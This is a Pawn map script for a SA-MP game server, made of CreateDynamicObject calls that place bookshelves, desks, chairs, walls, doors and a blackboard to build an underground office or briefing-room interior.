	CreateDynamicObject(1742,1576.6000000,-1716.4000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(med_bookshelf) (1)
	CreateDynamicObject(1742,1576.5996000,-1709.4004000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(med_bookshelf) (2)
	CreateDynamicObject(1742,1576.6000000,-1710.8000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(med_bookshelf) (3)
	CreateDynamicObject(1742,1576.5996000,-1712.2002000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(med_bookshelf) (4)
	CreateDynamicObject(1742,1576.5996000,-1713.5996000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(med_bookshelf) (5)
	CreateDynamicObject(1742,1576.5996000,-1715.0000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(med_bookshelf) (6)
	CreateDynamicObject(19358,1578.0000000,-1717.4004000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (27)
	CreateDynamicObject(19358,1581.0000000,-1717.4004000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (27)
	CreateDynamicObject(19388,1583.6000000,-1717.4004000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw15) (1)
	CreateDynamicObject(949,1589.5000000,-1708.7998000,-37.2000010,0.0000000,0.0000000,0.0000000); //object(plant_pot_4) (4)
	CreateDynamicObject(2161,1582.0000000,-1716.8000000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(med_office_unit_4) (1)
	CreateDynamicObject(2164,1581.0000000,-1717.3000000,-37.7999990,0.0000000,0.0000000,180.0000000); //object(med_office_unit_5) (1)
	CreateDynamicObject(2167,1579.2000000,-1717.3000000,-37.7999990,0.0000000,0.0000000,180.0000000); //object(med_office_unit_7) (1)
	CreateDynamicObject(11631,1579.3000000,-1709.0000000,-36.5999980,0.0000000,0.0000000,0.0000000); //object(ranch_desk) (1)
	CreateDynamicObject(1671,1582.5000000,-1712.7002000,-37.4000020,0.0000000,0.0000000,87.6214600); //object(swivelchair_a) (2)
	CreateDynamicObject(19447,1596.1000000,-1712.9000000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (1)
	CreateDynamicObject(19447,1592.6000000,-1712.9004000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (4)
	CreateDynamicObject(19447,1582.2000000,-1712.9000000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (5)
	CreateDynamicObject(19447,1589.2002000,-1712.9004000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (6)
	CreateDynamicObject(19447,1585.7002000,-1712.9004000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (9)
	CreateDynamicObject(19447,1578.7600000,-1712.9000000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (10)
	CreateDynamicObject(19447,1577.9000000,-1712.9000000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (11)
	CreateDynamicObject(19452,1578.2002000,-1732.2000000,-37.9000020,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19452,1585.2002000,-1732.2002000,-37.9000020,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19452,1581.7002000,-1732.2002000,-37.9000020,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19452,1588.7002000,-1732.2000000,-37.9000020,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19452,1592.2002000,-1732.2000000,-37.9000020,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19452,1595.5898000,-1732.2002000,-37.9000020,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19358,1597.3000000,-1728.5000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1597.3000000,-1731.1000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1597.3000000,-1734.2000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1597.3000000,-1737.0000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1576.5000000,-1727.5000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (14)
	CreateDynamicObject(19358,1576.5000000,-1730.5996000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (14)
	CreateDynamicObject(19358,1576.5000000,-1733.7998000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (14)
	CreateDynamicObject(19358,1576.5000000,-1736.7000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (14)
	CreateDynamicObject(19358,1587.0000000,-1719.1000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(19358,1587.0000000,-1722.3000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(19358,1587.0000000,-1725.5000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(19358,1588.5000000,-1727.2000000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(19358,1591.7000000,-1727.2000000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(19388,1595.6000000,-1727.2000000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw15) (1)
	CreateDynamicObject(19358,1592.4000000,-1727.2000000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(2748,1592.9000000,-1718.1000000,-37.2000010,0.0000000,0.0000000,0.0000000); //object(cj_donut_chair2) (1)
	CreateDynamicObject(2747,1596.4000000,-1719.4000000,-37.4000020,0.0000000,0.0000000,0.0000000); //object(cj_donut_table) (1)
	CreateDynamicObject(2748,1593.1000000,-1724.3000000,-37.2000010,0.0000000,0.0000000,180.0000000); //object(cj_donut_chair2) (2)
	CreateDynamicObject(2748,1596.4004000,-1718.0996000,-37.2000010,0.0000000,0.0000000,0.0000000); //object(cj_donut_chair2) (3)
	CreateDynamicObject(2747,1592.8000000,-1719.5000000,-37.4000020,0.0000000,0.0000000,0.0000000); //object(cj_donut_table) (2)
	CreateDynamicObject(2748,1596.5000000,-1720.7002000,-37.2000010,0.0000000,0.0000000,179.9945100); //object(cj_donut_chair2) (4)
	CreateDynamicObject(2748,1596.5000000,-1721.9000000,-37.2000010,0.0000000,0.0000000,0.0000000); //object(cj_donut_chair2) (5)
	CreateDynamicObject(2748,1593.0000000,-1721.9000000,-37.2000010,0.0000000,0.0000000,0.0000000); //object(cj_donut_chair2) (6)
	CreateDynamicObject(2747,1593.0000000,-1723.2000000,-37.4000020,0.0000000,0.0000000,0.0000000); //object(cj_donut_table) (3)
	CreateDynamicObject(2747,1596.4000000,-1723.2000000,-37.4000020,0.0000000,0.0000000,0.0000000); //object(cj_donut_table) (4)
	CreateDynamicObject(2748,1593.0000000,-1720.7002000,-37.2000010,0.0000000,0.0000000,179.9945100); //object(cj_donut_chair2) (7)
	CreateDynamicObject(2748,1596.4000000,-1724.3000000,-37.2000010,0.0000000,0.0000000,179.9945100); //object(cj_donut_chair2) (8)
	CreateDynamicObject(2448,1589.0000000,-1721.7000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(cj_ff_conter_5d) (1)
	CreateDynamicObject(2448,1589.0000000,-1719.4004000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(cj_ff_conter_5d) (2)
	CreateDynamicObject(2450,1589.2000000,-1722.4000000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(cj_ff_conter_5b) (1)
	CreateDynamicObject(1776,1587.5000000,-1726.5000000,-36.7000010,0.0000000,0.0000000,90.0000000); //object(cj_candyvendor) (1)
	CreateDynamicObject(1775,1587.6000000,-1725.3000000,-36.7000010,0.0000000,0.0000000,90.0000000); //object(cj_sprunk1) (1)
	CreateDynamicObject(1502,1594.8000000,-1727.2000000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(gen_doorint04) (1)
	CreateDynamicObject(1502,1580.3000000,-1730.2000000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(gen_doorint04) (2)
	CreateDynamicObject(19358,1582.7000000,-1719.1000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(19358,1582.7000000,-1722.3000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(19358,1582.7000000,-1725.5000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(19358,1582.7000000,-1728.7000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(19358,1578.0000000,-1730.2000000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(19388,1581.0996000,-1730.2002000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw15) (1)
	CreateDynamicObject(1502,1582.7998000,-1717.4399000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(gen_doorint04) (3)
	CreateDynamicObject(1998,1581.2000000,-1718.9000000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(officedesk1l) (1)
	CreateDynamicObject(1998,1579.3000000,-1718.9000000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(officedesk1l) (2)
	CreateDynamicObject(1998,1577.4000000,-1718.9000000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(officedesk1l) (3)
	CreateDynamicObject(2008,1577.0996000,-1728.4004000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(officedesk1) (2)
	CreateDynamicObject(2008,1577.0996000,-1726.0996000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(officedesk1) (3)
	CreateDynamicObject(2008,1577.2002000,-1723.5996000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(officedesk1) (4)
	CreateDynamicObject(2008,1581.1000000,-1723.5996000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(officedesk1) (5)
	CreateDynamicObject(2008,1581.1000000,-1726.0996000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(officedesk1) (6)
	CreateDynamicObject(1671,1579.7002000,-1710.0996000,-37.4000020,0.0000000,0.0000000,179.9945100); //object(swivelchair_a) (3)
	CreateDynamicObject(1671,1580.3000000,-1719.0000000,-37.4000020,0.0000000,0.0000000,179.9945100); //object(swivelchair_a) (4)
	CreateDynamicObject(1671,1582.2000000,-1719.0000000,-37.4000020,0.0000000,0.0000000,179.9945100); //object(swivelchair_a) (5)
	CreateDynamicObject(1671,1578.0000000,-1724.8000000,-37.4000020,0.0000000,0.0000000,179.9945100); //object(swivelchair_a) (6)
	CreateDynamicObject(1671,1582.1000000,-1724.8000000,-37.4000020,0.0000000,0.0000000,179.9945100); //object(swivelchair_a) (7)
	CreateDynamicObject(1671,1578.0000000,-1727.2000000,-37.4000020,0.0000000,0.0000000,179.9945100); //object(swivelchair_a) (8)
	CreateDynamicObject(1671,1578.1000000,-1729.8000000,-37.4000020,0.0000000,0.0000000,179.9945100); //object(swivelchair_a) (9)
	CreateDynamicObject(1671,1582.0000000,-1727.5000000,-37.4000020,0.0000000,0.0000000,179.9945100); //object(swivelchair_a) (10)
	CreateDynamicObject(19452,1578.2002000,-1741.7998000,-37.9000020,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19452,1581.7002000,-1741.7998000,-37.9000020,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19452,1585.2002000,-1741.7998000,-37.9000020,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19452,1588.7002000,-1741.8000000,-37.9000020,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19452,1592.2002000,-1741.8000000,-37.9000020,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19452,1595.5898000,-1741.8000000,-37.9000020,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19452,1578.2002000,-1751.4000000,-37.9000020,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19452,1581.7001953,-1751.4003906,-37.9000015,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19452,1588.7002000,-1751.4004000,-37.9000020,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19452,1585.2002000,-1751.4004000,-37.9000020,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19452,1592.2002000,-1751.4004000,-37.9000020,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19452,1595.5898000,-1751.4000000,-37.9000020,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19358,1597.3000000,-1740.2000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1597.3000000,-1743.4000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1597.3000000,-1746.5000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1597.3000000,-1749.6000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1576.5000000,-1739.8000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1576.5000000,-1742.3000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1576.5000000,-1745.0000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1576.5000000,-1747.8000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1576.5000000,-1750.7000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1576.5000000,-1753.8000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1576.5000000,-1755.8000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1597.3000000,-1752.8000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1597.2998000,-1755.0996000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1593.0000000,-1756.2002000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1590.2002000,-1756.2002000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1587.5000000,-1756.2002000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1584.4004000,-1756.2002000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1581.5996000,-1756.2002000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1578.0000000,-1756.2002000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1578.5000000,-1756.2002000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19447,1596.0996000,-1722.5000000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1589.2002000,-1722.5000000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (13)
	CreateDynamicObject(19447,1592.5996000,-1722.5000000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (14)
	CreateDynamicObject(19447,1585.7002000,-1722.5000000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (15)
	CreateDynamicObject(19447,1582.2002000,-1722.5000000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (16)
	CreateDynamicObject(19447,1578.7598000,-1722.5000000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (17)
	CreateDynamicObject(19447,1578.0996000,-1722.4004000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (18)
	CreateDynamicObject(18767,1574.5000000,-1735.6000000,-34.2999990,0.0000000,0.0000000,0.0000000); //object(stands) (1)
	CreateDynamicObject(18767,1574.1000000,-1735.6000000,-34.2999990,0.0000000,0.0000000,0.0000000); //object(stands) (2)
	CreateDynamicObject(19358,1578.1000000,-1731.7000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1578.0996000,-1736.7002000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1578.0996000,-1733.5000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1596.2002000,-1756.2002000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1577.9004000,-1744.7998000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1581.0996000,-1744.7998000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19388,1582.7000000,-1731.9000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw15) (1)
	CreateDynamicObject(1502,1582.7300000,-1732.6700000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(gen_doorint04) (4)
	CreateDynamicObject(19358,1582.7000000,-1735.1000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(19358,1582.7000000,-1738.3000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(19358,1582.7000000,-1741.5000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(19358,1582.7000000,-1743.2000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(2949,1576.5699000,-1744.0000000,-37.7999990,0.0000000,0.0000000,180.0000000); //object(kmb_lockeddoor) (1)
	CreateDynamicObject(19358,1592.9004000,-1744.7998000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(19358,1587.5000000,-1733.0000000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(19358,1584.2998000,-1733.0000000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(19388,1590.7002000,-1733.0000000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw15) (1)
	CreateDynamicObject(1502,1589.9004000,-1733.0000000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(gen_doorint04) (6)
	CreateDynamicObject(19358,1593.0000000,-1733.0000000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(19358,1594.5000000,-1734.7000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1594.5000000,-1737.9000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1594.5000000,-1741.1000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1594.5000000,-1743.3000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1584.2998000,-1744.7998000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(19358,1587.5000000,-1744.7998000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(19358,1590.7002000,-1744.7998000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(14532,1583.5996000,-1733.7998000,-36.7999990,0.0000000,0.0000000,221.2097200); //object(tv_stand_driv) (1)
	CreateDynamicObject(14532,1593.4004000,-1743.5996000,-36.7999990,0.0000000,0.0000000,48.0596920); //object(tv_stand_driv) (2)
	CreateDynamicObject(3077,1584.5000000,-1743.0000000,-38.2000010,0.0000000,0.0000000,307.2500000); //object(nf_blackboard) (1)
	CreateDynamicObject(2606,1577.7000000,-1708.3000000,-35.1199990,0.0000000,0.0000000,0.0000000); //object(cj_police_counter2) (1)
	CreateDynamicObject(2606,1577.7002000,-1708.2998000,-34.7000010,0.0000000,0.0000000,0.0000000); //object(cj_police_counter2) (2)
	CreateDynamicObject(1721,1591.8000000,-1742.5000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (1)
	CreateDynamicObject(1721,1591.8000000,-1741.9000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (2)
	CreateDynamicObject(1721,1591.8000000,-1741.3000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (3)
	CreateDynamicObject(1721,1591.8000000,-1740.7000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (4)
	CreateDynamicObject(1721,1591.8000000,-1740.1000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (5)
	CreateDynamicObject(1721,1591.8000000,-1739.5000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (6)
	CreateDynamicObject(1721,1591.8000000,-1738.9000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (7)
	CreateDynamicObject(1721,1591.8000000,-1738.3000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (8)
	CreateDynamicObject(1721,1591.8000000,-1737.7000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (9)
	CreateDynamicObject(1721,1591.8000000,-1737.1000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (10)
	CreateDynamicObject(1721,1590.0000000,-1742.4000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (11)
	CreateDynamicObject(1721,1590.0000000,-1741.8000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (12)
	CreateDynamicObject(1721,1590.0000000,-1741.2000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (13)
	CreateDynamicObject(1721,1590.0000000,-1740.6000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (14)
	CreateDynamicObject(1721,1590.0000000,-1740.0000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (15)
	CreateDynamicObject(1721,1590.0000000,-1739.4000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (16)
	CreateDynamicObject(1721,1590.0000000,-1738.8000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (17)
	CreateDynamicObject(1721,1590.0000000,-1738.2000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (18)
	CreateDynamicObject(1721,1590.0000000,-1737.6000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (19)
	CreateDynamicObject(1721,1590.0000000,-1737.0000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (20)
	CreateDynamicObject(1721,1588.3000000,-1742.4000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (21)
	CreateDynamicObject(1721,1588.3000000,-1741.8000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (22)
	CreateDynamicObject(1721,1588.3000000,-1741.2000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (23)
	CreateDynamicObject(1721,1588.3000000,-1740.6000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (24)
	CreateDynamicObject(1721,1588.3000000,-1740.0000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (25)
	CreateDynamicObject(1721,1588.3000000,-1739.4000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (26)
	CreateDynamicObject(1721,1588.3000000,-1738.8000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (27)
	CreateDynamicObject(1721,1588.3000000,-1738.2000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (28)
	CreateDynamicObject(1721,1588.3000000,-1737.6000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (29)
	CreateDynamicObject(1721,1588.3000000,-1737.0000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(est_chair1) (30)
	CreateDynamicObject(2614,1582.9000000,-1738.6000000,-35.5999980,0.0000000,0.0000000,90.5000000); //object(cj_us_flag) (1)
	CreateDynamicObject(2614,1591.8000000,-1717.2000000,-35.5999980,0.0000000,0.0000000,181.7500000); //object(cj_us_flag) (2)
	CreateDynamicObject(14532,1583.5996000,-1733.7998000,-36.7999990,0.0000000,0.0000000,221.2097200); //object(tv_stand_driv) (1)
	CreateDynamicObject(2491,1585.4000000,-1738.4000000,-38.2999990,0.0000000,0.0000000,0.0000000); //object(model_stand) (1)
	CreateDynamicObject(19447,1596.1000000,-1732.0000000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1589.2002000,-1732.0000000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1582.2002000,-1732.0000000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1585.7002000,-1732.0000000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1579.9000000,-1732.0000000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1578.0996000,-1725.3000000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (18)
	CreateDynamicObject(19358,1595.6000000,-1749.0000000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(19447,1592.5996000,-1732.0000000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19388,1592.4000000,-1749.0000000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw15) (1)
	CreateDynamicObject(19358,1589.2000000,-1749.0000000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(19388,1586.0000000,-1749.0000000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw15) (1)
	CreateDynamicObject(19358,1582.8000000,-1749.0000000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(19388,1579.6000000,-1749.0000000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw15) (1)
	CreateDynamicObject(19358,1577.0000000,-1749.0000000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(1502,1578.8000000,-1749.0000000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(gen_doorint04) (6)
	CreateDynamicObject(1502,1591.5996000,-1749.0996000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(gen_doorint04) (6)
	CreateDynamicObject(1502,1585.2002000,-1749.0000000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(gen_doorint04) (6)
	CreateDynamicObject(19358,1582.8000000,-1755.8000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(19358,1582.7998000,-1750.7002000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(19358,1582.7998000,-1753.9004000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(19358,1589.1000000,-1755.8000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(19358,1589.0996000,-1750.5000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(19358,1589.0996000,-1753.7002000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(1999,1593.8000000,-1754.0000000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(officedesk2) (1)
	CreateDynamicObject(1742,1595.0000000,-1749.1000000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(med_bookshelf) (7)
	CreateDynamicObject(1742,1593.5996000,-1749.0996000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(med_bookshelf) (8)
	CreateDynamicObject(1714,1594.7000000,-1755.4000000,-37.7999990,0.0000000,0.0000000,174.7500000); //object(kb_swivelchair1) (1)
	CreateDynamicObject(1721,1595.6000000,-1752.3000000,-37.7999990,0.0000000,0.0000000,142.7500000); //object(est_chair1) (31)
